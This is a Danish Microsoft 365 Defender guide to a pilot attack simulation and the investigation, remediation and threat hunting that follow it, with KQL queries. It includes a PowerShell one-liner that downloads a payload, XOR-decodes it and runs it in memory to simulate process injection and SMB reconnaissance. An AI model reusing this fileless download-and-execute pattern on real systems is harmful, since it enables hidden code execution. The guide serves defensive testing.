---
title: Kør dine Microsoft 365 Defender-angrebssimulering
description: Kør angrebssimulering for Microsoft 365 Defender pilotprojekt for at se, hvordan det udvikler sig og hurtigt afhjælpes.
keywords: Microsoft 365 Defender for pilotangreb skal du køre Microsoft 365 Defender simulering af pilotangreb, simulere angreb Microsoft 365 Defender, Microsoft 365 Defender  pilotprojekt, cybersikkerhed, avanceret vedvarende trussel, virksomhedssikkerhed, enheder, enhed, identitet, brugere, data, programmer, hændelser, automatiseret undersøgelse og afhjælpning, avanceret jagt
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 18dc8158ef3c806e5dac5a01778adebc6eecc1ce
ms.sourcegitcommit: 9856f86532bdcf0befbcdbdb7c6dc6bf89fe63b5
ms.translationtype: MT
ms.contentlocale: da-DK
ms.lasthandoff: 07/16/2021
ms.locfileid: "63599311"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>Kør dine Microsoft 365 Defender-angrebssimulering

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![Planlægning](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)<br/>[Planlægning](m365d-pilot-plan.md)|[![Forbered](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)<br/>[Forberedelse](prepare-m365d-eval.md)|![Simulere angreb](../../media/phase-diagrams/3-simluate.png)<br/>Simulere angreb|[![Luk og opsummer](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)<br/>[Luk og opsummer](m365d-pilot-close.md)|
|--|--|--|--|
|||*Du er her!*||

Du er i øjeblikket i angrebssimuleringsfasen.

Når du har forberedt dit pilotmiljø, er det tid til at teste Microsoft 365 Defender hændelsesstyring og automatiserede undersøgelses- og afhjælpningsfunktioner. Vi hjælper dig med at simulere et avanceret angreb, der udnytter avancerede teknikker til at skjule fra registrering. Angrebene optæller åbne SMB-sessioner (Server Message Block) på domænecontrollere og henter de seneste IP-adresser på brugernes enheder. Denne kategori af angreb omfatter normalt ikke filer, der er tabt på offerets enhed – de findes udelukkende i hukommelsen. De "lever uden for landet" ved hjælp af eksisterende system- og administrationsværktøjer og indsætter deres kode i systemprocesserne for at skjule deres udførelse, en sådan funktionsmåde giver dem mulighed for at undgå registrering og bevare deres registrering på enheden.

I denne simulering starter vores eksempelscenarie med et PowerShell-script. En bruger kan være tricket til at køre et script. Eller scriptet kan køre fra en fjernforbindelse til en anden computer fra en tidligere inficeret enhed – hackeren, der forsøger at bevæge sig senere i netværket. Registrering af disse scripts kan være svært, fordi administratorer også ofte kører scripts eksternt for at udføre forskellige administrative aktiviteter.

![Filløs PowerShell-angreb med procesindtrædelse og diagram over SMB-rekognosering af angreb](../../media/mtp/mtpdiydiagram.png)

Under simulering indsætter angrebene shellcode i en tilsyneladende proces, der virker som en proces, der virker som en proces. Scenariet kræver brug af notepad.exe. Vi valgte denne proces til simulering, men hackere vil mere sandsynligt målrette en længere proces i systemet, f.eks. svchost.exe. Shellkoden går derefter videre og kontakter hackerens kommando- og kontrolserver (C2) for at få instruktioner om, hvordan du fortsætter. Scriptet forsøger at udføre rekognoseringsforespørgsler mod domænecontrolleren (DC). Rekognossance gør det muligt for en hacker at få oplysninger om de seneste brugerlogonoplysninger. Når hackere har disse oplysninger, kan de bevæge sig senere i netværket for at få adgang til en bestemt følsom konto

> [!IMPORTANT]
> For optimale resultater skal du følge simuleringsinstruktionerne til angreb så tæt som muligt.

## <a name="simulation-environment-requirements"></a>Krav til simuleringsmiljø

Da du allerede har konfigureret dit pilotmiljø under forberedelsesfasen, skal du sikre dig, at du har to enheder til dette scenarie: en testenhed og en domænecontroller.

1. Kontrollér, at din lejer [har Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. Bekræft konfigurationen af testdomænecontrolleren:

   - Enheden kører med Windows Server 2008 R2 eller en nyere version.
   - Testdomænecontrolleren [til Microsoft Defender for Identity,](/azure/security-center/security-center-wdatp) og [aktivér fjernadministration](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).
   - Kontrollér, [at Microsoft Defender for Identity og Microsoft Cloud App Security integration](/cloud-app-security/mdi-integration) er blevet aktiveret.
   - Der oprettes en testbruger på dit domæne – der kræves ingen administratortilladelser.

3. Bekræft konfiguration af testenhed:

   1. Enheden kører med Windows 10 version 1903 eller en nyere version.

   1. Testenhed er forbundet til testdomænet.

   1. [Slå Windows Defender Antivirus til](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Hvis du har problemer med at aktivere Windows Defender Antivirus, skal du se dette [fejlfindingsemne](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).

   1. Kontrollér, at testenheden [er onboardet til Microsoft Defender for Endpoint)](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

Hvis du bruger en eksisterende lejer og implementerer enhedsgrupper, skal du oprette en dedikeret enhedsgruppe til testenheden og skubbe den til det øverste niveau i konfigurations-UX.

## <a name="run-the-attack-scenario-simulation"></a>Kør simulering af angrebsscenariet

Sådan kører du simulering af angrebsscenariet:

1. Log på testenheden med testbrugerkontoen.

2. Åbn Windows PowerShell vindue på testenheden.

3. Kopiér følgende simuleringsscript:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Hvis du åbner dokumentet i en webbrowser, kan der opstå problemer med at kopiere hele teksten uden at miste bestemte tegn eller introducere ekstra linjeskift. Download dette dokument, og åbn det på Adobe Reader.

4. Når du bliver bedt om det, skal du indsætte og køre det kopierede script.

> [!NOTE]
> Hvis du kører PowerShell ved hjælp af REMOTE Desktop Protocol (RDP), skal du bruge kommandoen Skriv udklipsholdertekst i RDP-klienten, fordi genvejstasten **CTRL-V** eller højreklik på indsætning måske ikke fungerer. Nyere versioner af PowerShell accepterer nogle gange heller ikke denne metode. Det kan også være, at du er nødt til at kopiere til Notesblok i hukommelsen først, kopiere den i den virtuelle maskine og derefter indsætte den i PowerShell.

Nogle få sekunder senere <i>notepad.exe</i> åbnes. Der vil blive indsatte simulerede angrebskode notepad.exe. Hold den automatisk oprettede forekomst Notesblok åben, så du kan se det fulde scenarie.

Den simulerede angrebskode vil forsøge at kommunikere til en ekstern IP-adresse (si hele C2-serveren) og derefter forsøge at omkonfigurere mod domænecontrolleren via SMB.

Du får vist en meddelelse på PowerShell-konsollen, når dette script er fuldført.

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Hvis du vil se funktionen Automatiseret hændelse og svar i aktion, skal notepad.exe processen åben. Du får vist automatiseret hændelse og svar for at stoppe Notesblok processen.

## <a name="investigate-an-incident"></a>Undersøg en hændelse

> [!NOTE]
> Før vi hjælper dig gennem denne simulering, skal du se følgende video for at finde ud af, hvordan hændelsesstyring hjælper dig med at samle de relaterede beskeder som en del af undersøgelsesprocessen, hvor du kan finde den på portalen, og hvordan den kan hjælpe dig i dine sikkerhedshandlinger:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Når du skifter til SOC-analytikerens synspunkt, kan du nu begynde at undersøge angrebene på Microsoft 365 Security Center-portalen.

1. Åbn den [Microsoft 365 Security Center-portalhændelseskøen](https://security.microsoft.com/incidents) fra en hvilken som helst enhed.

2. Gå **til Hændelser** fra menuen.

    ![Skærmbillede af hændelser, som vist Microsoft 365 i Sikkerhedscenters menu til venstre](../../media/mtp/fig1.png)

3. Den nye hændelse for de simulerede angreb vises i hændelseskøen.

    ![Skærmbillede af hændelseskøen](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>Undersøg angrebene som en enkelt hændelse

Microsoft 365 Defender korrelerer analyser og samler alle relaterede beskeder og undersøgelser fra forskellige produkter til én hændelsesenhed. Ved at gøre dette viser Microsoft 365 Defender en bredere angrebshistorie, så SOC-analytikeren kan forstå og reagere på komplekse trusler.

De beskeder, der genereres under denne simulering, er knyttet til den samme trussel, og derfor sammenlægges de automatisk som en enkelt hændelse.

Sådan får du vist hændelsen:

1. Gå til **køen Hændelser** .

   ![Skærmbillede af hændelser fra navigationsmenuen](../../media/mtp/fig1.png)

2. Vælg det nyeste element ved at klikke på cirklen, der er placeret til venstre for navnet på hændelsen. Et sidepanel viser yderligere oplysninger om hændelsen, herunder alle de relaterede beskeder. Hver hændelse har et entydigt navn, der beskriver det baseret på attributterne for de beskeder, den indeholder.

   ![Skærmbillede af siden med hændelser, hvor genererede beskeder samles under simulering](../../media/mtp/fig4.png)

   De beskeder, der vises på dashboardet, kan filtreres ud fra tjenesteressourcer: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender til Slutpunkt, Microsoft 365 Defender og Microsoft Defender for Office 365.

3. Vælg **Åbn hændelsesside** for at få flere oplysninger om hændelsen.

   På siden **Hændelse** kan du se alle de beskeder og oplysninger, der er relateret til hændelsen. Oplysningerne omfatter de enheder og aktiver, der er involveret i beskeden, registreringskilden til beskederne (Microsoft Defender for Identity Slutpunktsregistrering og -svar) og årsagen til, at de blev sammenkædet. Når du gennemgår listen over hændelser, kan du se forløbet af angrebene. I denne visning kan du se og undersøge de enkelte beskeder.

   Du kan også klikke **på Administrer** hændelse i højre menu for at mærke hændelsen, tildele den til dig selv og tilføje kommentarer.

   ![Skærmbillede af, hvor du skal klikke på Administrer hændelse](../../media/mtp/fig5a.png)

   ![Skærmbillede af felterne i panelet Administrer hændelse, hvor du kan mærke hændelsen, tildele den til dig selv og tilføje kommentarer](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>Gennemse genererede beskeder

Lad os se på nogle af de beskeder, der genereres under de simulerede angreb.

> [!NOTE]
> Vi gennemgår kun nogle få af de beskeder, der genereres under de simulerede angreb. Afhængigt af versionen af Windows og Microsoft 365 Defender-produkter, der kører på din testenhed, får du muligvis vist flere beskeder, der vises i en lidt anden rækkefølge.

![Skærmbillede af genererede beskeder](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>Advarsel: Mistænkelig indførsel af proces, som er blevet observeret (kilde: Microsoft Defender til Slutpunktsregistrering og -svar)

Avancerede hackere bruger avancerede og avancerede metoder til at bevare deres hukommelse og skjule dem fra registreringsværktøjer. En almindelig metode er at arbejde inde fra en pålidelig systemproces i stedet for en skadelig eksekverbar fil, hvilket gør det svært for registreringsværktøjer og sikkerhedshandlinger at opdage den skadelige kode.

For at give SOC-analytikere mulighed for at opfange disse avancerede angreb, giver de dybe hukommelsessensorer i Microsoft Defender til Slutpunkt vores skytjeneste, hvor de kan se de forskellige teknikker til indløsning af kode på tværs af processer. Følgende figur viser, hvordan Defender til slutpunktet har registreret og advaret ved forsøget på at indsætte kode <i>notepad.exe</i>.

![Skærmbillede af beskeden om indhentning af potentielt skadelig kode](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>Advarsel: Uventet funktionsmåde, der observeres af en proces, der kører uden kommandolinjeargumenter (kilde: Microsoft Defender til Slutpunktsregistrering og -svar)

Registreringer af Microsoft Defender til slutpunkter målretter ofte den mest almindelige attribut for en angrebsteknik. Denne metode sikrer, at hackere kan skifte til nyere taktikker, og hæver linjen.

Vi anvender læringsalgoritmer i stor skala til at etablere den normale funktionsmåde for almindelige processer i en organisation og i hele verden og holder øje med, når disse processer viser unormal adfærd. Disse unormale funktionsmåder indikerer ofte, at overflødig kode blev introduceret og kører i en ellers pålidelig proces.

I dette scenarie udviser <i>notepad.exe</i> unormal adfærd, der involverer kommunikation med en ekstern placering. Dette resultat er uafhængigt af den specifikke metode, der bruges til at introducere og udføre den skadelige kode.

> [!NOTE]
> Da denne besked er baseret på maskinlæringsmodeller, der kræver yderligere backendbehandling, kan det tage lidt tid, før du får vist denne besked på portalen.

Bemærk, at advarselsoplysningerne omfatter den eksterne IP-adresse – en indikator, som du kan bruge som en pivot til at udvide undersøgelsen.

Vælg IP-adressen i beskedprocestræet for at få vist siden med oplysninger om IP-adressen.

![Skærmbillede af beskeden om uventet funktionsmåde ved at køre en proces uden kommandolinjeargumenter](../../media/mtp/fig8.png)

I følgende figur vises den valgte side med oplysninger om IP-adresse (når du klikker på IP-adressen i træet Beskedproces).
![Skærmbillede af siden med oplysninger om IP-adressen](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Besked: Bruger- og IP-adresserekognosering (SMB) (kilde: Microsoft Defender til identitet)

Optælling ved hjælp af SMB-protokollen (Server Message Block) gør det muligt for hackere at få de seneste logonoplysninger, der hjælper dem med at bevæge sig senere gennem netværket for at få adgang til en bestemt følsom konto.

Under denne registrering udløses der en besked, når SMB-sessionens optælling kører mod en domænecontroller.

![Skærmbillede af Omkonfigurering af Microsoft Defender for Identity for bruger og IP-adresse](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>Gennemse enhedens tidslinje [Microsoft Defender til slutpunkt]

Når du har udforsket de forskellige beskeder i denne hændelse, skal du gå tilbage til den hændelsesside, du undersøgte tidligere. Vælg fanen **Enheder** på hændelsessiden for at gennemgå de enheder, der er involveret i denne hændelse, som rapporteret af Microsoft Defender til Slutpunkt og Microsoft Defender for Identity.

Vælg navnet på den enhed, hvor angrebene blev udført, for at åbne enhedssiden for den pågældende enhed. På denne side kan du se beskeder, der blev udløst, og relaterede hændelser.

Vælg fanen **Tidslinje** for at åbne enhedens tidslinje og få vist alle hændelser og funktionsmåder, der er observeret på enheden i kronologisk rækkefølge, der er indbyrdes for beskederne hævet.

![Skærmbillede af enhedens tidslinje med funktionsmåder](../../media/mtp/fig11.png)

Ved at udvide nogle af de mere interessante funktionsmåder får du nyttige oplysninger, f.eks. procestræer.

Rul f.eks. ned, indtil du finder hændelsen Mistænkelig indhændelse **observeret**. Vælg den **powershell.exe, der notepad.exe** en proceshændelse under sig, for at få vist hele procestræet til denne funktionsmåde under grafen Hændelsesenheder  i sideruden. Brug søgelinjen til filtrering, hvis det er nødvendigt.

![Skærmbillede af procestræet til den valgte funktionalitet til oprettelse af PowerShell-filer](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>Gennemse brugeroplysningerne [Microsoft Cloud App Security]

På hændelsessiden skal du vælge fanen **Brugere** for at få vist listen over brugere, der er involveret i angrebene. Tabellen indeholder yderligere oplysninger om hver bruger, herunder hver brugers vurdering af **undersøgelsesprioritet** .

Vælg brugernavnet for at åbne brugerens profilside, hvor yderligere undersøgelse kan udføres. [Læs mere om undersøgelse af risikabelt bruger](/cloud-app-security/tutorial-ueba#identify).

![Skærmbillede af Cloud App Security brugerside](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>Automatiseret undersøgelse og afhjælpning

> [!NOTE]
>Før vi hjælper dig gennem denne simulering, skal du se følgende video for at få kendskab til, hvad automatiseret selvbetjening er, hvor du kan finde den på portalen, og hvordan den kan hjælpe dig i dine sikkerhedshandlinger:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Gå tilbage til hændelsen i Microsoft 365 Security Center-portalen. Fanen **Undersøgelser på** **siden Hændelse viser** de automatiserede undersøgelser, der blev udløst af Microsoft Defender for Identity og Microsoft Defender til Slutpunkt. Skærmbilledet nedenfor viser kun den automatiske undersøgelse, der udløses af Defender til Slutpunkt. Som standard afhjælper Defender til slutpunkt automatisk de artefakter, der findes i køen, hvilket kræver afhjælpning.

![Skærmbillede af automatiserede undersøgelser relateret til hændelsen](../../media/mtp/fig14.png)

Vælg den besked, der udløste en undersøgelse, for at åbne **siden Undersøgelsesoplysninger** . Du får vist følgende detaljer:

- Beskeder, der udløste den automatiske undersøgelse.
- På påvirkede brugere og enheder. Hvis der findes indikatorer på flere enheder, vises disse yderligere enheder også.
- Liste over beviser. De enheder, der er fundet og analyseret, f.eks. filer, processer, tjenester, drivere og netværksadresser. Disse enheder analyseres for mulige relationer til beskeden og klassificeres som bengalske eller skadelige.
- Der blev fundet trusler. Kendte trusler, der blev fundet under undersøgelsen.

> [!NOTE]
> Afhængigt af tidsindstillingen kører den automatiske undersøgelse muligvis stadig. Vent et par minutter, indtil processen er fuldført, før du indsamler og analyserer beviserne og gennemgår resultaterne. Opdater siden **med undersøgelsesoplysninger** for at få de nyeste resultater.

![Skærmbillede af siden Undersøgelsesoplysninger](../../media/mtp/fig15.png)

Under den automatiserede undersøgelse identificerede Microsoft Defender for Endpoint notepad.exe processen, der blev tilføjet som en af de artefakter, der kræver afhjælpning. Defender til Slutpunkt stopper automatisk den mistænkelige procesindsætning som en del af den automatiske afhjælpning.

Du kan se <i>notepad.exe</i> forsvinder fra listen over kørende processer på testenheden.

## <a name="resolve-the-incident"></a>Løs hændelsen

Efter undersøgelsen er afsluttet og bekræftet, at afhjælpningen er afsluttet, skal du lukke hændelsen.

Vælg **Administrer hændelse**. Angiv status til Løs **hændelse, og** vælg den relevante klassificering.

Når hændelsen er løst, lukkes alle de tilknyttede beskeder i Microsoft 365 Security Center og i de relaterede portaler.

![Skærmbillede af siden Hændelser med det åbne Administrer hændelsespanel, hvor du kan klikke på knappen for at løse hændelsen](../../media/mtp/fig16.png)

Dette omslutter angrebssimulering for hændelsesstyring og automatiserede undersøgelses- og afhjælpningsscenarier. Den næste simulering vil tage dig gennem proaktiv trusselssøgning efter potentielt skadelige filer.

## <a name="advanced-hunting-scenario"></a>Avanceret scenarie med jagt

> [!NOTE]
> Før vi hjælper dig gennem simuleringsarbejdet, skal du se følgende video for at forstå de avancerede jagtkoncepter, se, hvor du kan finde den på portalen, og se, hvordan den kan hjælpe dig i dine sikkerhedshandlinger:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>Krav til jagtmiljø

Der kræves en enkelt intern postkasse og enhed i dette scenarie. Du skal også bruge en ekstern mailkonto for at sende testmeddelelsen.

1. Kontrollér, at din lejer [har aktiveret Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).
2. Identificer en destinationspostkasse, der skal bruges til at modtage mails.
    a. Denne postkasse skal overvåges af Microsoft Defender, for Office 365 b. Enheden fra krav 3 skal have adgang til denne postkasse
3. Konfigurer en testenhed: a. Sørg for, at du bruger Windows 10 version 1903 eller nyere version.
    b. Deltag i testenheden til testdomænet.
    c. [Slå Windows Defender Antivirus til](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Hvis du har problemer med at aktivere Windows Defender Antivirus, skal du se [dette fejlfindingsemne](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
    d. [Onboard to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

### <a name="run-the-simulation"></a>Kør simulering

1. Fra en ekstern mailkonto skal du sende en mail til den postkasse, der blev identificeret i trin 2 i afsnittet om testmiljøkrav. Medtag en vedhæftet fil, der tillades via eventuelle eksisterende politikker for mailfiltrering. Denne fil behøver ikke at være skadelig eller eksekverbar. Foreslåede filtyper <i> er.pdf</i>, <i>.exe</i> (hvis det er tilladt) eller et Office, f.eks. en Word-fil.
2. Åbn den sendte mail fra den enhed, der er konfigureret som defineret i trin 3 i afsnittet om testmiljøkrav. Åbn enten den vedhæftede fil, eller gem filen på enheden.

#### <a name="go-hunting"></a>Gå på jagt

1. Åbn security.microsoft.com portalen.

2. Naviger til **> Avanceret på jagt**.

   ![Skærmbillede af avanceret jagt på navigationslinjen i portalen M365 Security Center](../../media/mtp/fig17.png)

3. Opret en forespørgsel, der starter, ved at indsamle mailbegivenheder.

   1. Vælg Ny i forespørgselsruden.

   1. Dobbeltklik på tabellen EmailEvents fra skemaet.

      ```console
      EmailEvents
      ```

   1. Ændre tidsrammen til de sidste 24 timer. Hvis den mail, du sendte, da du kørte simulering ovenfor, var inden for de seneste 24 timer, kan du ellers ændre tidsrammen.

      ![Skærmbillede af, hvor du kan ændre tidsrammen. Åbne rullemenuen for at vælge mellem forskellige tidsrammeindstillinger](../../media/mtp/fig18.png)

   1. Kør forespørgslen. Du kan have mange resultater afhængigt af miljøet for pilotprojektet.

      > [!NOTE]
      > Se næste trin for at få filtreringsindstillinger til at begrænse dataretur.

      ![Skærmbillede af resultaterne af den avancerede forespørgsel](../../media/mtp/fig19.png)

        > [!NOTE]
        > Avanceret forespørgsel viser forespørgselsresultater som tabeldata. Du kan også vælge at få vist dataene i andre formattyper, f.eks. diagrammer.

   1. Kig på resultaterne, og se, om du kan identificere den mail, du har åbnet. Det kan tage op til 2 timer, før meddelelsen vises i avanceret jagt. Hvis mailmiljøet er stort, og der er mange resultater, kan det være en god ide at bruge **indstillingen Vis filtre** til at finde meddelelsen.

      I eksemplet blev mailen sendt fra en Yahoo-konto. Klik på **+** ikonet ud **yahoo.com** under sektionen SenderFromDomain, og klik derefter på **Anvend** for at føje det valgte domæne til forespørgslen. Brug domænet eller mailkontoen, der blev brugt til at sende testmeddelelsen i trin 1 af Kør simulering for at filtrere dine resultater. Kør forespørgslen igen for at få et mindre resultatsæt for at bekræfte, at du ser meddelelsen fra simulering.

      ![Skærmbillede af filtrene. Brug filtre til hurtigere at indskrænke søgningen og finde det, du leder efter.](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. Klik på de resulterende rækker fra forespørgslen, så du kan undersøge posten.

      ![Skærmbillede af sidepanelet til undersøgelse af poster, som åbnes, når der er valgt et avanceret jagtresultat](../../media/mtp/fig21.png)

4. Nu hvor du har bekræftet, at du kan se mailen, kan du tilføje et filter for de vedhæftede filer. Fokuser på alle mails med vedhæftede filer i miljøet. I dette scenarie skal du fokusere på indgående mails, ikke dem, der sendes ud fra dit miljø. Fjern eventuelle filtre, du har tilføjet, for at finde din meddelelse og tilføje "| where **AttachmentCount > 0** and **EmailDirection** == **"Inbound""**

   Følgende forespørgsel viser dig resultatet med en kortere liste end din indledende forespørgsel for alle mailhændelser:

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. Medtag derefter oplysningerne om den vedhæftede fil (f.eks.: filnavn, hashes) til resultatsættet. Det gør du ved at deltage **i tabellen EmailAttachmentInfo** . De almindelige felter, der skal bruges til at deltage i, er i dette tilfælde **NetworkMessageId** **og RecipientObjectId**.

   Følgende forespørgsel indeholder også en ekstra linje "| **omdøb projekt EmailTimestamp=Timestamp**", som hjælper med at identificere, hvilket tidsstempel der var relateret til mailen kontra tidsstempler, der er relateret til filhandlinger, som du vil tilføje i næste trin.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. Derefter skal du bruge **værdien SHA256** fra tabellen **EmailAttachmentInfo** til at finde **DeviceFileEvents** (filhandlinger, der skete på slutpunktet) for den pågældende hash hash. Det almindelige felt her er SHA256-hash'en for den vedhæftede fil.

   Den resulterende tabel indeholder nu oplysninger fra slutpunktet (Microsoft Defender til slutpunkt), f.eks. enhedsnavn, hvilken handling der blev udført (i dette tilfælde filtreret til kun at medtage FileCreated-hændelser), og hvor filen blev gemt. Det kontonavn, der er knyttet til processen, medtages også.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   Du har nu oprettet en forespørgsel, der identificerer alle indgående mails, hvor brugeren har åbnet eller gemt den vedhæftede fil. Du kan også finjustere denne forespørgsel for at filtrere efter bestemte afsenderdomæner, filstørrelser, filtyper osv.

7. Funktioner er en særlig type joinforbindelse, som giver dig mulighed for at trække flere TI-data om en fil som dens oplysninger om dens underskriver og udsteder osv. For at få flere oplysninger om filen skal du bruge **funktionen FileProfile()** berigende:

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>Oprette en registrering

Når du har oprettet en forespørgsel, der identificerer oplysninger, du gerne vil have besked  om, hvis de forekommer i fremtiden, kan du oprette en brugerdefineret registrering ud fra forespørgslen.

Brugerdefinerede registreringer kører forespørgslen i overensstemmelse med den frekvens, du har angivet, og resultaterne af forespørgslerne opretter sikkerhedsadvarsler baseret på de påsvarede aktiver, du vælger. Disse beskeder korreleres med hændelser og kan omdeles som andre sikkerhedsadvarsler, der genereres af et af produkterne.

1. På forespørgselssiden skal du fjerne linje 7 og 8, der blev tilføjet i trin 7 i gå på jagtinstruktioner, og klikke **på Opret registreringsregel**.

   ![Skærmbillede af, hvor du kan klikke på opret registreringsregel på den avancerede jagtside](../../media/mtp/fig22.png)

   > [!NOTE]
   > Hvis du klikker **på Opret registreringsregel** , og du har syntaksfejl i forespørgslen, gemmes din registreringsregel ikke. Dobbelttjek din forespørgsel for at sikre, at der ikke er nogen fejl.

2. Udfyld de påkrævede felter med de oplysninger, der gør det muligt for sikkerhedsteamet at forstå beskeden, hvorfor den blev oprettet, og hvilke handlinger du forventer, de skal udføre.

   ![Skærmbillede af siden til registrering af regler for oprettelse, hvor du kan definere oplysninger om beskeden](../../media/mtp/fig23.png)

   Sørg for, at du udfylder felterne med klarhed for at give den næste bruger en informeret beslutning om denne besked om registreringsregel

3. Vælg, hvilke enheder der påvirkes af denne besked. I dette tilfælde skal du vælge **Enhed** og **postkasse**.

   ![Skærmbillede af siden opret registreringsregel, hvor du kan vælge parametrene for de påtrykte enheder](../../media/mtp/fig24.png)

4. Afgør, hvilke handlinger der skal foregå, hvis beskeden udløses. I dette tilfælde skal du køre en antivirusscanning, selvom der kan blive foretaget andre handlinger.

   ![Skærmbillede af siden opret registreringsregel, hvor du kan køre en antivirus-scanning, når en besked udløses for at hjælpe med at håndtere trusler](../../media/mtp/fig25.png)

5. Vælg området for beskedreglen. Da denne forespørgsel involverer enheder, er enhedsgrupperne relevante i denne brugerdefinerede registrering i henhold til Microsoft Defender til slutpunktskontekst. Når du opretter en brugerdefineret registrering, der ikke omfatter enheder som på påvirkede enheder, gælder omfang ikke.

   ![Skærmbillede af siden til oprettelse af registreringsregel, hvor du kan angive omfanget for beskedreglen, administrerer dine forventninger til de resultater, du får vist](../../media/mtp/fig26.png)

   For dette pilotprojekt kan det være en god ide at begrænse denne regel til et undersæt af testenheder i produktionsmiljøet.

6. Vælg **Opret**. Vælg derefter **Brugerdefinerede registreringsregler** fra navigationspanelet.

   ![Skærmbillede af indstillingen Brugerdefinerede registreringsregler i menuen](../../media/mtp/fig27a.png)

   ![Skærmbillede af siden med registreringsregler, der viser oplysninger om reglen og udførelsen](../../media/mtp/fig27b.png)

   Fra denne side kan du vælge registreringsreglen, som åbner en detaljeside.

   ![Skærmbillede af siden med vedhæftede filer i mails, hvor du kan se status for udførelse af reglen, udløse beskeder og handlinger, redigere registreringen, og så videre](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>Yderligere avancerede gennemgangs øvelser

Hvis du vil vide mere om avanceret jagt, vil følgende webcasts hjælpe dig gennem mulighederne i avanceret jagt i Microsoft 365 Defender til at oprette forespørgsler på tværs af søjler, pivotere til enheder og oprette brugerdefinerede registreringer og afhjælpningshandlinger.

> [!NOTE]
> Vær forberedt med din egen GitHub-konto til at køre vores jagtforespørgsler i dit pilottestlaboratormiljø.

|Titel|Beskrivelse|Download MP4|Se på YouTube|CSL-fil, der skal bruges|
|---|---|---|---|---|
|Episode 1: Grundlæggende om KQL|Vi kommer til at dække det grundlæggende om avancerede muligheder for at Microsoft 365 Defender. Få mere at vide om tilgængelige avancerede jagtdata og grundlæggende KQL-syntaks og operatorer.|[MP4](https://aka.ms/MTP15JUL20_MP4)|[YouTube](https://youtu.be/0D9TkGjeJwM)|[Episode 1: CSL-fil i Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
